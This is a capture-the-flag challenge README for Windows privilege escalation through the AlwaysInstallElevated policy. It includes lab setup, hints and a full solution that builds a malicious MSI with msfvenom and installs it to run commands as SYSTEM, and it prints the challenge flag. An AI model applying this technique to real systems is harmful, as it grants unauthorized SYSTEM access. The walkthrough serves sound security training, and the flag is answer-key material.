# Challenge 2  AlwaysInstallElevated

**Difficulty:** Easy  
**Category:** Windows Privilege Escalation  
**Flag:** hidden at `C:\CTF\challenge2\flag.txt`

---

## Story

You're `ctfplayer`  a standard user with no admin rights.
Something is wrong with this machine's Group Policy.
Every `.msi` installer runs as SYSTEM, no matter who double-clicks it.

---

## Setup

1. Start a **Windows VM**
2. Open PowerShell **as Administrator**
3. Run:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
.\setup.ps1
```

4. Log in as `ctfplayer` / `Player123!`

> **Important:** Take a VM snapshot before setup. Revert afterward  this policy is a real vulnerability.

---

## Background

The `AlwaysInstallElevated` Group Policy (when set to `1` in **both** HKLM and HKCU) causes Windows Installer (MSI) packages to install with SYSTEM privileges, regardless of the current user's rights. This lets any user run arbitrary code as SYSTEM by crafting a malicious MSI.

---

## Hints

<details>
<summary>Hint 1</summary>
Check the registry for the misconfiguration:

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both must be set to `0x1` for the vulnerability to be exploitable.
</details>

<details>
<summary>Hint 2</summary>
You need to create a malicious `.msi` file. The easiest tool for this is `msfvenom`:

```bash
msfvenom -p windows/x64/exec CMD='...' -f msi -o evil.msi
```

Or use `msitools` / WiX on Linux/Mac to craft a minimal MSI.
</details>

<details>
<summary>Hint 3</summary>
The MSI just needs to run a command as SYSTEM. For the CTF, copy the flag somewhere readable:

```
CMD='cmd /c copy C:\CTF\challenge2\flag.txt C:\Users\Public\flag.txt && icacls C:\Users\Public\flag.txt /grant Everyone:F'
```
</details>

---

## Solution

<details>
<summary>Click to reveal  try on your own first!</summary>

### Step 1  Confirm the vulnerability

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both return `0x1`.

### Step 2  Generate the malicious MSI (on your attack machine / Kali)

```bash
msfvenom -p windows/x64/exec \
  CMD='cmd /c copy C:\CTF\challenge2\flag.txt C:\Users\Public\flag.txt && icacls C:\Users\Public\flag.txt /grant Everyone:F' \
  -f msi -o evil.msi
```

Transfer `evil.msi` to the Windows VM (shared folder, HTTP server, etc.).

### Step 3  Install the MSI as ctfplayer

```powershell
msiexec /quiet /qn /i C:\Users\ctfplayer\Desktop\evil.msi
```

Windows runs the installer as SYSTEM  your command executes with full privileges.

### Step 4  Read the flag

```powershell
type C:\Users\Public\flag.txt
```

```
CTF{msi_4lw4ys_3l3v4t3d_pwn}
```

### Why this works

`AlwaysInstallElevated` was designed for corporate environments where users need to install approved software without admin rights. When enabled without proper controls (e.g., allowing only signed, approved MSIs via AppLocker), any user can create a custom MSI and execute arbitrary code as SYSTEM.

</details>
